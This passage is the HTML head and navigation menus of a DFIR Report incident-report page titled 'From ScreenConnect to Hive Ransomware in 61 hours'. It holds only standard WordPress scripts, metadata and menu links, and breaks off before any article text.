<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>From ScreenConnect to Hive Ransomware in 61 hours &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/21520" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=21520" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F09%2F25%2Ffrom-screenconnect-to-hive-ransomware-in-61-hours%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F09%2F25%2Ffrom-screenconnect-to-hive-ransomware-in-61-hours%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="bb4c8a2ffab6f225d2c1407e-text/javascript"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=77B75CAFE3CDE7FAB5827C50445ADDBA');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="From ScreenConnect to Hive Ransomware in 61 hours" />
<meta property="og:url" content="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" />
<meta property="og:description" content="In 2022, The DFIR Report observed an increase in the adversarial usage of Remote Management and Monitoring (RMM) tools. When compared to post-exploitation channels that heavily rely on terminals, s…" />
<meta property="article:published_time" content="2023-09-25T00:58:24+00:00" />
<meta property="article:modified_time" content="2024-05-22T10:59:14+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png" />
<meta property="og:image:width" content="535" />
<meta property="og:image:height" content="433" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="From ScreenConnect to Hive Ransomware in 61 hours" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-21520 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
